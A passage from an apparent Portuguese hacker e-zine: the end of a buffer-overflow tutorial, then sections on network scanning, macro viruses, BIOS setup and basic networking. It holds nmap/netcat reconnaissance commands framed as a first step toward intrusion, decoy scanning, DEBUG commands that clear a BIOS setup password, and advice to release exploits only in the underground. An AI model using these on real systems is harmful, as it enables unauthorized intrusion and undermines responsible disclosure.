sempre um brutal  force(tentando encher um  buffer com muitos  dados), e ver  se
consegue obter essa resposta.Isso eh util em programas com codigos  fechados,mas
mesmo para programas deste tipo  existe uma solucao "melhor".Existe por  aih, um
programa capaz de descompilar um  programa.Isso mesmo, coisa rustica ainda,  mas
pode ser util,voce pode  obter mais informacoes sobre  isso e baixar uma  versao
deste programa em http://www.it.uq.edu.au/groups/csm/dcc.html.

Algum tempo  atras, pouco  tempo, saiu  um programa  chamado its4.Esse  programa
seria um "grep" melhorado, pois ele checa um codigo fonte em busca de  possiveis
vulnerabilidades,  apontando  possiveis  solucoes(troca  da  funcao,checagem  de
bounds,etc), bem como indicando o nivel de risco no uso de cada funcao, e  ainda
permite uma atualizacao dos dados(acrescentar ou retirar uma funcao  considerada
bugada).Este   programa   eh   muito   conhecido   e   pode   ser   obtido    em
http://www.rtscorp.com/its4 ou  mesmo nos  sites de  seguranca por  aih, como na
packetstorm, http://packetstorm.securify.com//. Mas ele por sih soh nao eh tudo,
pois tambem divulga informacoes erradas, creio que uma busca serene e incessante
de conhecimento de C  eh mais do que  essencial.Breve o Unsekurity Team  deverah
estar publicando mais textos no intuito de massificar conhecimentos nesta  area,
bem como abranger mais sistemas operacionais.

Irei enumerar  algumas das  funcoes que  sao reconhecidas  como sendo perigosas,
pois podem ser vulneraveis a  ataques de buffer overflows, nao  irei diferenciar
quanto a regiao  de memoria, mas  a maioria pode  ser exploitada tanto  via Heap
como Stack overflows.Sao elas:

strcpy();
scanf();
fscanf();
strcat();
gets();
fgets();
fprintf();
sprintf();
vsprintf();
strstr();
bzero();
bcopy();
getopt();
getpass();
getcwd;
popen();
system();
execvp();
avoid execlp();

Tambem podem ocorrer overflows sob certas circunstancias em:

strncpy();
strncat();
getenv();
atexit();
strdup();
tmpnam();
malloc();
readdir();
seekdir();
printf();

Dentre possivelmente outras.

Como voce  pode ver,nao  sao poucas  as funcoes,  e dependendo  sim do  nivel do
fucador, eh possivel  gerar overflows em  qualquer funcao descritas  acima.Agora
que voce jah tem conhecimento de como nao eh tao dificil gerar um overflow,  mas
o quanto eh  dificil fazer um  programa complexo seguro,  creio que devemos  sim
respeitar os  programadores bem  como a  comunidade de  seguranca, nao  eh facil
fazer um programa  com milhares de  linhas de codigos  sem possuir uma  condicao
para buffer  overflow. De  qualquer forma,tendo  em vista  um maior  aprendizado
nisso tudo, iremos de  alguma forma forcar a  escrita de codigos mais  seguros e
estaveis, tudo para que o usuario comum possa algum dia ter a seguranca de  usar
um programa  ou navegar  na internet  e etc,  sem a  preocupacao de alguem estar
bisbilhotando seus dados.Fucadores eticos respeitam os dados das pessoas e lutam
contra as grandes corporacoes para garantir a privacidade dessas pessoas,  mesmo
que lah fora elas nao saibam as reais causas que nos levam a isso tudo, acredito
que  eh  mais  do  que  gratificante  forcar  esse  pessoal(grandes  corporacoes
inescrupulosas) a fazer o que nao querem, que eh dar maior qualidade e seguranca
ao uso pessoal dos computadores de um modo geral.


Aproveito essa parte para dizer algo tambem.Eu estava pensando em publicar algum
exploit de nossa autoria, mas aih um membro do grupo me alertou para algo que eu
ainda nao havia pensado: "Nao  devemos publicar nossos exploits", quando  muito,
devemos liberar apenas aos mais intimos e conhecidos que de fato nao publicarao,
por que??

* Primeiro  -> A comunidade de seguranca estah ficando cada vez mais
               rica.Sao empresas e mais empresas trabalhando para as
               corporacoes, e em nenhum momento eles gastam dinheiro
               para divulgar a causa hacker(digo hacker,nao cracker!),
               pois eles jah estao inseridos no sistema.

* Segundo   -> Talvez voce tenha algum exploit proprio para sistemas
               abertos, como linux que afete uma distribuicao descente.
               Quando eu falo descente amigo, digo "Debian", pois ateh
               mesmo o Slackware tah seguindo no rumo de capitalizar
               dinheiro em cima do linux.Se voce descobrir um exploit
               para um sistema como Debian, aconselho voce a divulgar
               de inicio ao pessoal que faz a distribuicao, os desenvo-
               vedores,programadores, procurando contato diretamente
               com eles.Mas se for para as outras distribuicoes linux,
               em especial Red Hat linux, Caldera Open Linux, Red Hat
               Conectiva Linux, Corel Linux, e o que tah vindo agora,
               Motorola Linux, divulgue seu exploit somente no
               underground, deixe que eles depois tratem de achar o
               bug e consertar, pois essas distribuicoes nao possuem
               escrupulos e estao denegrindo e se aproveitando do
               trabalho alheio.Abram os olhos, quem nao garante que
               amanha a Red Hat nao seja uma nova microsoft???

* Terceiro ->  A comunidade de seguranca na sua maioria(alguns ainda
               escapam) nao se importam com voce, querem que voce vah
               preso, e nao fazem questao de diferenciar o termo
               hacker do termo cracker, simplesmente porque eles
               ganham quando a midia divulga os criminosos que trazem
               prejuizos para todos.Por isso, amigo, se teu ego falar
               alto porque voce conseguiu descobrir algo novo, cuidado
               voce vai ajudar esses caras, mas eles nao irao ajudar
               voce, caso um dia precise.

* Quarto ->    Um cara que divulga um exploit para um determinado bug,
               que se diz de um grupo fucador ou nao, deve ter em mente
               o perigo que representa a divulgacao do exploit, me refiro
               ao uso desse exploit por parte dos kiddies e lamers.Uma
               coisa eh voce dizer que tal programa possui um bug em
               determinada funcao, outra eh voce disponibilizar um
               exploit para isso.A realidade, eh que o pessoal que irah
               fazer um exploit para o bug descoberto por voce, eh bem
               reduzido, no entanto, caso divulgue um exploit, o
               universo do pessoal que o usarah seja lah para quais
               intuitos for, serah demasiadamente grande.Nos ataques de
               DDoS recentes, um dos "fabricantes" de uma das possiveis
               ferramentas usadas foi severamente acusado de participar
               diretamente dos ataques, que garantia voce terah que nao
               farao isso contigo??


Bom, esses sao soh alguns itens que me levam a fazer apologia da "Nao Divulgacao
de Exploits" por parte de fucadores.Sei que a comunidade de seguranca nao  gosta
deste tipo de  ideologia,mas lembrando, nao  eh para eles  que escrevo.Nao deixe
seu ego tomar conta de voce mano!!Faca as coisas com conciencia!!

----------------
10 - TERMINANDO |
----------------

10.1 Links e Referencias
--------------------------

"Smashing The Stack For Fun And Profit" por Aleph One.
Pode ser obtido em: http://www.phrack.com -> Zine 49, item 14.
                    http://packetstorm.securify.com/ -> Manda achar.
                    http://www.technotronic.com/
                    http://www.2600.com/phrack/
                    http://www.securityfocus.com/

"w00w00 on Heap Overflows"  por Matt Conover.
Pode ser obtido em: http://www.w00w00.org/
                    http://www.securityfocus.com/

"adv.overflow.paper" por Taeho Oh.
Pode ser obtido em: http://www.technotronic.com/
                    http://www.securityfocus.com/

"STACK OVERFLOW EXPLOiTS ON LiNUX/BSDOS/FREEBSD/SUNOS/SOLARiS/HP-UX" -
 Feito pelo pessoal da The Hacker's Choice.
Pode ser obtido em: www.infowar.co.uk/thc/ -> Procure por thc-mag3.zip.


"Writing buffer overflow exploits - a tutorial for beginners" por Mixter.
Pode ser encontrado em:
http://members.tripod.com/mixtersecurity/papers.html
http://1337.tsx.org/

"How to write Buffer Overflows" - por Mudge.
Pode ser obtido em :
http://www.l0pht.com/
http://www.insecure.org/stf/mudge_buffer_overflow_tutorial.html

"Buffer Overruns, whats the real story?" - por Lefty.
Pode ser obtido em: http://packetstorm.securify.com/
                    http://www.securityfocus.com/

"Attack Class: Buffer Overflows" - por Evan Thomas.
Pode ser obtido em: http://helloworld.ca/

** Existem bons materiais em portugues, que merecem sim uma olhada.
   Nao sei aonde se acha, mas sei dos zines da Axur e da RWX.
   Procure em algum sistema de busca.

Axur0503.new - Item 6 - "The Stack" - por csh.

rwx01.txt - Item 2 - "OVERFLOWS" - por auth.

** E tambem um bom material recente:

mbcbuffer.txt - "INSIDE TO BUFFERS OVERFLOWS" - por  cync.
Pode ser obtido em: http://www.mbc-corp.com.br

Nao conheco outros txts  em portugues, mas vale  a gratidao a todos  aqueles que
tem contribuido  para democratizar  informacoes nao  soh no  nosso pais  como em
todos os cantos da Terra.


Alguns links:

http://bounce.to/unah16/  -> Info sobre o Projeto Omega.

http://www.posthuman.za.net -> Zine f0rbidden knowledge, procure a
                               edicao 08, tem algo sobre overflows.


"Crispin Cowan, et al., StackGuard: Automatic Adaptive Detection and
 Prevention of Buffer-Overflow Attacks" - Sobre o Stack Guard.
http://www.cse.ogi.edu/DISC/projects/immunix/StackGuard/usenixsc98_html/

.........................................................................

10.2 Consideracoes Finais.
--------------------------

Aih estah  amigo, por  enquanto isso  eh tudo.Em  breve estarei disponibilizando
mais materiais de nivel, visando maior abrangencia de conhecimentos por parte de
todos aqueles que  se encontrarem dispostos  a aprender.Tem muitas  coisas sobre
buffer  overflows  ainda,  creio  que  em  breve  estarei  disponibilizando mais
tutoriais  sobre  programacao de  sockets  e shellcodes  acoplando  junto sempre
exemplos de buffer overflows. Em breve estarah sendo disponibilizado algo tambem
referente a programacao IPC, bem como  alguma coisa sobre TCP/IP. Com a  chegada
destes materiais,  vai ficar  mais facil  a compreensao  de futuros tutoriais de
sockets, investindo em UDP e RAW  sockets, bem como com a chegada  dos tutoriais
de IPC,  em exploitacao  remota e  de funcoes  mais complexas.Eh  soh questao de
tempo, paciencia amigo!!

Gostaria de agradecer aqueles que de uma forma ou de outra, tem colaborado com a
distribuicao das  informacoes aqui  contidas, bem  como ao  pessoal que tem dado
apoio.Espero  que tudo  isso sirva  para alguem,  bem como  que isso  possa ser
passado para mais e mais pessoas,  visando nao praticar coisas ruins, creio  que
ainda ha espaco para a etica, e a beleza da etica, ainda pode mudar pessoas, por
isso, amigo, faca sua parte, nao deixe a
chama apagar, mas nao queime nunca alguem com ela.

Termino aqui direcionando  meus agradecimentos a  Ramona, meu grande  amigo zip,
module, psych,  e-brain, raynox,  t[rex], xf86config,  cs0, Cdma,  Matt_Salermo,
Dani_Linidinha,  CeZiNHa,  f00,   ocorvo,  thunderoffire,  Blind_Bard,   d3m3ns,
Dinamite_, e Magic Kiss.:)

                                         Nash Leon vulgo coracaodelao
                                         nashleon@yahoo.com.br

----------------------------------EOF-----------------------------------





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 15 ]=-=[ Varreduras e Varreduras ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

--[Introdução]--

As  varreduras  (scanning)  são  feitas  para  se  obter  informações  sobre  um
determinado servidor ou de  toda uma rede, sendo  portanto, um ponto de  partida
para  a  invasão  de  qualquer  sistema.  Veremos  aqui  algumas  das   técnicas
utilizadas.


--[Varreduras de Ping]--

O ping envia pacotes TCP_ECHO para um computador, afim de verificar se ele  está
ativo. Ele pode ser usado para verificar o número de sistemas ativos numa  rede,
embora seja um método lento para grandes redes. Existem inúmeros programas  para
fazer essa varredura. Se quiséssemos determinar sistemas ativos numa rede classe
C usando o fping, faríamos:

richard@debian:~$ gping 10 4 0 1 254 | fping -a

10.4.0.1 is alive
10.4.0.4 is alive
10.4.0.30 is alive
10.4.0.100 is alive

Caso  o tráfego  ICMP seja  bloqueado, podemos  tentar uma  varredura ping  TCP,
usando o nmap com a opção -PT e uma porta:

debian:/# nmap -sP -PT25 10.4.0.0/24
TCP probe port is 25
Starting nmap V. 2.54BETA34 ( www.insecure.org/nmap/ )
Host (10.4.0.1) appears to be up.
Host (10.4.0.5) appears to be up.
Host (10.4.0.30) appears to be up.
Host (10.4.0.100) appears to be up.
Nmap run completed -- 256 IP addresses (4 hosts up) scanned in 7 seconds

É uma boa idéia utilizar outras portas comuns, como 80 (http) e 110 (POP).


--[Varredura de Portas]--

Com a varredura de ping e TCP, nós identificamos os computadores ativos da rede.
Agora, faremos a varredura de portas, para verificar quais serviços estão  sendo
executados em cada máquina e o seu sistema operacional.

No Windows,  pode-se utilizar  o PortPro  (www.securityfocus.com), já  no Linux,
utilizaremos o netcat:

debian:/# nc -v -z -w3 10.4.0.1 1-150
[10.4.0.1] 143 (imap) open
[10.4.0.1] 139 (netbios-ssn) open
[10.4.0.1] 111 (sunrpc) open
[10.4.0.1] 80 (http) open
[10.4.0.1] 25 (smtp) open
[10.4.0.1] 22 (ssh) open
[10.4.0.1] 21 (ftp) open

A opção -v serve para detalhar a  saída; -z é um modo usado em  varreduras (zero
I/O); -w serve para definir o timeout  para as conexões; 1-150 é o intervalo  de
portas que deve ser varrido.  Pode-se também realizar uma varredura  UDP através
da opção -u.

Com  o  nmap,  podemos fazer  uma  varredura  SYN, que  é  mais  dificil de  ser
detectada. Podemos usar ainda a  opção -D, que inicia varreduras  "falsas" junto
com a verdadeira, afim de dificultar a detecção.

debian:/# nmap -sS 10.4.0.1 -D www.isca.com,ME -p21,22,23,25,80
Starting nmap V. 2.54BETA34 ( www.insecure.org/nmap/ )
Interesting ports on (10.4.0.1):
(The 1 port scanned but not shown below is in state: closed)
Port State Service
21/tcp open ftp
22/tcp open ssh
25/tcp open smtp
80/tcp open http
Nmap run completed -- 1 IP address (1 host up) scanned in 0 seconds

Com  o  nmap,  podemos  tentar  detectar  qual  sistema  operacional  está sendo
executado no computador alvo, através da opção -O:

debian:/# nmap -O 10.4.0.1
Starting nmap V. 2.54BETA34 ( www.insecure.org/nmap/ )
Interesting ports on (10.4.0.1):
(The 1544 ports scanned but not shown below are in state: closed)
Port State Service
21/tcp open ftp
22/tcp open ssh
25/tcp open smtp
80/tcp open http
111/tcp open sunrpc
139/tcp open netbios-ssn
143/tcp open imap2
443/tcp open https
675/tcp open unknown
700/tcp open unknown
1024/tcp open kdm
4559/tcp open hylafax

Remote operating system guess: Linux Kernel 2.4.0 - 2.4.18 (X86)
Uptime 9.508 days (since Tue Apr 22 05:48:17 2003)
Nmap run completed -- 1 IP address (1 host up) scanned in 6 seconds


Agora que já sabemos o sistema  operacional e os serviços que são  executados no
computador,  podemos  determinar  a  versão  de  cada  um,  em  busca  de falhas
conhecidas. Para isso, abra  uma conexão telnet para  uma das portas abertas  do
servidor digite algo e dê ENTER:

debian:/# telnet 10.4.0.1 80
Trying 10.4.0.1...
Connected to 10.4.0.1.
Escape character os '^]'.
asd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>501 Method Not Implemented</TITLE>
</HEAD><BODY>
<H1> Method Not Implemented</H1>
asd to /index.html not suppported. <P>
Invalid method in request asd<P>
<HR>
<ADDRESS>Apache/1.3.26 Server at phoenix.lab.nom.br Port 80</ADDRESS>
</BODY></HTML>
Connection closed by foreign host.


Agora  que sabemos  que o  servidor está  executando o  Apache 1.3.26,  podemos
procurar por vulnerabilidades desta versão, e tentar ganhar acesso na maquina.

Caso  o servidor  alvo seja  UNIX e  esteja executando  o rpcbind  (porta 111),
podemos utilizar o rpcinfo para verificar quais aplicativos RPC estão ativos:

debian:/# rpcinfo -p 10.4.0.1
program vers proto port
100000 2 tcp 111 portmapper
100000 2 udp 111 portmapper
100011 1 udp 672 rquotad
100011 1 tcp 675 rquotad
100005 1 udp 1024 mountd
100005 1 tcp 1024 mountd
100005 2 udp 1024 mountd
100005 2 tcp 1024 mountd
100003 2 udp 2049 nfs
100003 3 udp 2049 nfs

Considerando ainda  um sistema  UNIX, se  este tiver  o NFS  ativo (porta 2049),
podemos conseguir alguma informação útil,  em algum diretório público (caso  ele
exista). Para listar os diretórios compartilhados, usamos o showmount:

debian:/# showmount -e 10.4.0.1
Export list for 10.4.0.1:
/home 10.4.0.*
/var/spool/mail 10.4.0.*


--[Finalizando]--

Vimos  aqui algumas  das muitas  técnicas que  podem ser  utilizadas para  obter
informações sobre determinadas máquinas ou  redes. Para uma melhor descrição  do
funcionamento de cada ferramenta utilizada e outras de suas opções, leia as  man
pages.

debian:/# man nmap
Formatting page, please wait... :P

hallucination <hallz@motdlabs.org>





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 16 ]=-=[ Vírus de Macro ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

                                 Virus De Macro



Nome de Macro			Roda
Autoexec			Quando você inicia o Word
AutoNew 			Quando você cria um novo Documento
AutoOpen 			Quando você abre um Documento
AutoClose 			Quando você fecha um Documento
AutoExit 			Quando Você sai do Word


Os Virus de macros  são feitos para calsar  danos em programas do  Office criado
pela Microsoft. Pelo menos  eu nunca vi nenhuma  queixa sobre o office  XP ter a
chance  de ser  infectado por  algum macro  antigo. Word  for Windows  armazena
macros, tão bem  como estilos, em  modelos de documento  (arquivos .DOT). Macros
globais são armazenados no arquivo NORMAL.DOT.

Como  falado  anteriormente,  o  Word  apenas  armazena  macros  em  modelos  de
documentos. Você não pode acrescentar uma macro para um documento normal de Word
(.DOC). Isso ajuda a eliminar a habilidade  de se espalhar um DMV da fonte  para
outros documentos (o que pode dramaticamente aumentar a quantidade de documentos
infectados).
Entretanto, existe uma alternativa.  Um modelo de Word  .DOT é muito similar  em
formato a um arquivo  .DOC. Os dois possuem  a mesma aparência e  funcionalidade
quando aberto no Word. Para infectar outros documento, o DMV no NORMAL.DOT checa
o documento para  ver se ele  já foi infectado  com o macro.  Se ele não  foi, o
macro salva  o arquivo  como um  documento modelo.  Isso faz  com que apareça na
parte de baixo da tela  uma barra de salvamento (o  que não é estranho, uma  vez
que  muitos  usuários usam  a  opção de  Auto-Salvamento).  Word agora  trata  o
documento atual como  um modelo, e  o macro DMV  no NORMAL.DOT pode  copiar a si
próprio para o documento atual.
Extensões  de arquivo  são muito  decepcionantes. Uma  vez que  enquanto que  o
documento possua uma extensão .DOC, ele  pode ser um modelo. Quando o  Word abre
um documento, ele não liga qual a extensão que o arquivo tem. Ele le o arquivo e
determina qual o  formato a ser  processado. A única  pista que você  pode ter é
quando você escolhe  o comando Salvar  Como no menu  Arquivo. Word tenta  forçar
você para salvar o modelo em um diretório padrão que contenha outros modelos  de
Word. Outra pista é  quando o Word pergunta  para você se você  deseja salvar as
modificações quando você fechar, mesmo  que você não tenha editado  o documento.
Como software de plataformas-múltiplas  geralmente trocam código comuns,  parece
que o  DMV pode  ser passado  de uma  plataforma para  outra. Por exemplo, se um
documento do  Word for  Windows está  infectado, depois  transferido para o Word
para Macintosh  então o  DMV pode  muito bem  infectar a  versão Mac do Word. Eu
nunca  testei isso  ainda, mas  isso pode  ser um  acontecimento provável.  Como
falado anteriormente, esse não é um  problema exclusivo para o Word for  Windows
(pesquisas indicam que o Excel  tem muitas mais vulnerabilidades ou  de produtos
feitos pela Microsoft. Macros automáticas  tem se tornado muito populares  entre
uma variedade de software-houses.

Removendo vírus de Word

Remover vírus de Word (DMV) é relativamente fácil. Primeiro rode o Word, depois:

· Se um  arquivo infectado está  aberto, então escolha  o comando Macro  do menu
Utilitários. Apague todas as macros do arquivo aberto e do NORMAL.DOT.

· Se  nenhum documento  está aberto,  escolha o  comando Macro  do menu Arquivo.
Apague todos os macro de NORMAL.DOT.


PROTEGENDO-SE CONTRO DMS'S DO WORD

Qualquer macro automática  pode ser facilmente  detectada escolhendo-se a  opção
Macro no  menu utilitários.  Uma macro  suspeita pode  ser examinada ou deletada
(com  sorte, antes  que ela  se execute,  senão...). A  Microsoft fornece  dois
métodos de desabilitar macros automáticas no Word.

Extraído do documento Q96565 no Banco de Dados de suporte para produtos Microsoft:
Também  há o  modo de  você ir  no Menu  INICIAR/LOCALIZAR/ARQUIVO OU  PASTAS e
digitar normal.dot , após achar ele  o delete e depois reinicie o  windows. Isto
será bem provavel que  você tenha conseguido extrair  o virus caso não  entre em
contato comigo...

Tutorial Desenvolvido por _LiNe_SkOFF_ #motd da rede Brasnet

Obs:  Nunca testei  estes métodos  no Office  XP, pois  eu não  afirmo que  isto
funcione nele... Mais não Custa nada tentar.





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 17 ]=-=[ Hardware ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Hardware - SETUP
RedEyes

A ROM BIOS, é a responsável pelo boot da maquina, e nela existem dois  firmwares
determinados pelo fabricante e que ficam residentes nos chips, BIOS (Basic Input
Output System - Sistema Básico de entrada e saída) responsável pela  comunicação
entre os dispositivos conectados  à placa mãe e  o POST (Power On  Self Test) um
auto  teste  de inicialização  que  testa os  dispositivos  mais importantes  do
sistema. Ex.: Memória RAM, HD, Floppy, etc.

E  nela  existem  configurações  que  podem  ser  alteradas  pelo  usuário, para
configurar e melhorar o desempenho da maquina. Lembrando que essas alterações só
devem ser feitas se você conhece  muito bem a mesma, por que  qualquer alteração
mal  feita,  certamente  causara   desde  travamento  na  inicialização   e  mal
funcionamento dos drivers, até a perda de dados no HD.

Obs.: Já ouviram falar de (B)icho (I)gnorante (O)perando (S)istema?! haha

Deixando  meu infame  humor de  lado, voltemos  ao assunto.  Como essa  memória
precisa ser livre para modificações, não pode estar alojada numa memória ROM,  e
também em nenhum outro dispositivo, como  o HD, porque elas também precisam  ser
configuradas  no Setup.  Dai você  me pergunta:  Aonde diabos  fica então  essa
bagaça?!!? E eu respondo: Elementar velhinho amigo! Ele esta ali bem  escondido,
alojado em uma memória de baixa capacidade,  que é capaz de funfar com o  mínimo
de  energia  possível.  Ela utiliza  uma  estrutura  especial de  semicondutores
chamados de CMOS ( Complementary Metal-Oxide Semicondutor) Semicondutor de Óxido
-  Metal  Complementar,  e  é  alimentado  apenas  por  uma  bateria  facilmente
localizada na placa mãe.

Enfim tudo isso  pra falar do  "SETUP". Que é  a área de  configuração, e é  bem
aonde eu  queria chegar,  de todo  o bla-bla-bla  é aqui  que a  coisa começa  a
interessar. Como existem muitos fabricantes de Setup por ai, fica impossível  eu
falar sobre  todos, então  resolvi falar  dos itens  de configuração mais comuns
entre diferentes modelos. Ta OK velhinho?!

Como todo mundo sabe, e se não sabe ta na hora de saber, o Setup aparece  quando
você pressiona a tecla “delete"  na inicialização da maquina.  Segue  um exemplo
da tela que deverá  aparecer (lembrando que o  layout muda também de  fabricante
para fabricante e que eu não sou  muito bom com word então ficou uma  tabela bem
tosca como exemplo haha... mas o que interessa são os itens velhinho então vamos
lá).



MARCA DO FABRICANTE – VERSÃO


     Standard CMOS Setup                                    Load Setup Defaults

     Advanced Setup                                         Save & Exit Setup

     Power Management                                       Exit Without Saving

     PCI / PnP Setup

     Features Setup

     IDE HDD Autodetection

     Password Setting



Para navegar entre os itens usa-se as teclas de navegação !!dã!!... essas  setas
que tem ai  no teclado rapaz,  pra cima, pra  baixo, pro lado,  pro outro e tal.
Para selecionar o item use “Enter”, e para modificar as opções use “Page Up”  ou
“Page Down”.


Standard CMOS Setup
É o primeiro item, e como o nome diz, responsável pelas configurações básicas do
Setup. Entre elas:

Data e Hora;
Configuração do HD -
Configuração do Floppy;
Configuração de Vídeo;
Detecção de Erros.

Data e Hora  – Aonde configuramos  o “Relógio” do  bicho. Obs.: Também  pode ser
feita pelo Sist. Oper.

Hard Disk – É aonde reconhecemos o(s) disco(s) rígido(s) do computador. Onde:
TYPE – Reconhece o disco – as seguintes opções de TYPE significam:
NONE -> Ausência de HD ou o mesmo não foi habilitado.
AUTO -> Reconhece o HD sempre que o computador for iniciado.
USER -> Configurações definidas pelo usuário.


Advanced Setup
Boot  Sequence:  A seqüência  de  dispositivos em  que  o BIOS  irá  procurar os
arquivos de inicialização.

Quick Power on Self Test: Acelera os testes de dispositivos antes de carregar  o
sistema.

PS/2 Mouse Support: Habilita ou desabilita a porta PS/2 do mouse.

Internal Cache: Habilita ou desabilita o uso da L1

External Cache: habilita ou desabilita o uso da L2.

OS select For DRAM >  64 Mb: Habilite essa opção  somente se você possui um  OS2
instalado, porque ele gerência mais de 64Mb de memória de forma diferente.

Boot  Up Floppy  Seek: habilitado  faz um  teste de  movimentação da  cabeça de
leitura/escrita do disquete na inicialização. (perda de tempo na minha opinião).

Security Option: Determina para qual  item será requisitada uma senha.  “SYSTEM”
ou “SETUP”.


Power Management Setup
Esse item gerência a energia dos dispositivos, por exemplo, você pode configurar
o sistema para desligar o HD quando ele ficar certo tempo inativo. O mesmo  pode
ser feito com o monitor. Mas tudo isso pode ser feito pelo Ruindows também com o
seu utilitário de gerenciamento de energia.


PCI / PnP Setup
Configura  o  sistema  para  reconhecer a  tecnologia  Plug  and  Play. A  opção
“Resources controled By”  deve ficar com  o valor “auto”,   isso evita que  você
tenha que configurar slot por slot.


Features Setup
Aqui você  configura as  portas que  controlam os  dispositivos IDE  (primária e
secundária),  Onboard FDD Controller que é o driver do disquete onboard que deve
sempre estar  habilitado, as  portas paralela  e serial  e as  portas USB  entre
outros.

OnChip IDE First Channel
OnChip IDE Second Channel

Estas duas opções devem estar sempre ativadas, porque permitem que o chipset  da
placa mãe controle as portas IDE primária e secundária.

IDE Primary Master PIO
IDE Primary Slave PIO
IDE Secondary Master PIO
IDE Secondary Slave PIO

Você deve  configurar essas  opções de  acordo com  os HDs  instalados, cada uma
representa  uma posição  lógica do  HD. Se  um dos  HDs trabalhar  no modo  PIO
(programação de entrada  e saída) você  pode determinar para  qual modo ele  foi
fabricado (MODE 0 – mais antigo e MODE 4 mais novo e mais rápido).

As  seguintes  opções só  devem  ser alteradas  se  você tiver  um  conhecimento
avançado sobre seus dispositivos, caso contrário, deixe esta opção em “auto”.

Onboard FDD  Controller: Controladora  do driver  de disquete  onboard –  sempre
habilitada.
Onboard Serial Port 1: Configuração da porta serial 1, (COM1, 3F8H,IRQ 4)
Onboard Serial Port 2: Configuração da porta serial 2, (COM2, 2F8H, IRQ 3)
Onboard Paralel Port: Configuração da porta paralela, (LPT1, 378H, IRQ 7)
Onboard Paralel  Port Mode:  As impressoras  e os  scanners trabalham  melhor na
configuração ECP, EPP.


IDE HDD Autodetection
Esse item é usado para detectar automaticamente os Hds instalados no micro.


Password Setting
Aqui você insere uma  senha que será cobrada  na inicialização do micro  (caso a
opção de Securyt Option  estiver em SYSTEM) ou quando alguém for entrar no Setup
(caso a opção do Securyt Option estiver em SETUP).


Load Default Setup
Recupera as opções padrão.


Save and Exit Setup
Salva suas alterações e reinicia o sistema.


Exit Without Saving
Sai do setup sem salvar as alterações.



Como retirar a senha do Setup?
Elementar meu  caro velhinho,  existem duas  maneiras e  ambas são  simples. Uma
delas é usando o DEBUG do DOS,  no prompt digite:

C:\> DEBUG [pressione enter]
0 70 2e [enter]
0 71 ff [enter]
q [enter]

Agora é só resetar a maquina que vai dar para entrar no setup tranquilis.  Agora
isso  só funciona  se a  senha estiver  no Setup,  se for  para o  sistema, não
adianta. Então você vai ter procurar um jumper na placa mãe nomeado “Clear CMOS”
ou “EXIT BAT” (Veja no manual da placa mãe). Daí você altera o jumper da posição
1-2 para 2-3 e espera uns 10  segundos antes de voltar para a 1-2.  Pronto. Você
acaba de resetar a CMOS e nada mais de senhas para atrapalhar.

É claro que não é só isso que  podemos falar sobre setup, não pare por aqui,  um
bom guia de consulta é o próprio manual da sua placa mãe. Lá você vai  encontrar
todos os detalhes (ou quase todos ) sobre cada item do seu setup.





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 18 ]=-=[ Básico sobre Redes ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

:::...Apresentacao.

Não leia este txt com  intuito de se tornar um expert em redes de  computadores,
se esse for o  seu objetivo depois naum  saia por aih dizendo:  pohh...li um txt
aih,,,mas non aprendi nada...!!!Eh  claro vc ja devia  saber o q estava  contido
lah neh :) Esse eh meu primeiro  txt, achei bem legal faze-lo sobre um  tema bem
interessante que  serve para  muitas coisas  e q  tambem estah  ao meu  alcance.
Abordarie o tema do  txt em partes, começarei  com a parte estruturada  da rede,
com os componetes(Hardware), depois em outra oportunidade falarei sobre tcp/ip e
afins. Prometo  dar continuidade  a txt,  ficaria muito  agradecido se  pudessem
fazer  comentarios por  e-mail ou  pelo irc  , pois  assim passaria  a dar  mais
qualidade ao assunto e faze-lo de forma mais 'interesante'.


:::...Topicos.

- Hardware de Rede


:::...Hardware de Rede.

Talvez esse  topico seja  de muita  importancia por  q aki  vc poderah encontrar
informacoes q vaum ser vitais para o aprendizado de varias outras coisas,  serah
de tamanha importancia o entendimento dessa parte para o entendimento do  TCP/IP
(na minha opiniao).

Quando falamos em redes hj lembramos de grandes redes, como a propria  internet,
ou talvez vc vicado  em jogos em rede  lembre daquela redezinha lah  do shopping
onde vc joga CounterStriker, para ambas as redes funcionarem eh muito importante
q quem as criou tenho usado de bom entendimento e usado bons equipamentos  senão
sua  conexao ficaria  muito lenta  e seu  jogo no  shopping um  saco, entre  os
equipamentos necessarios para um bom funcionamento da rede, pretendo abordar  de
um a um, estao:

 - Terminais (Pcs)
 - Cabos
 - HUBs
 - Switches
 - Roteadores

Acho q saum soh esses mesmos no  caso de uma rede basica(com certeza em  grandes
redes existem equipamentos q eu nem conheco).

* Terminais - com certeza no tem nem muito o q comentar sobre esse componente da
rede, terminais dos mais variados tipos podem estar conectados em uma rede, naum
importa o  tipo do  Pc, processador  ou quantidade  de memoria,  ele poderah ser
conectado a rede contando q ele tenha uma placa de rede PCI,ISA, ou modelos mais
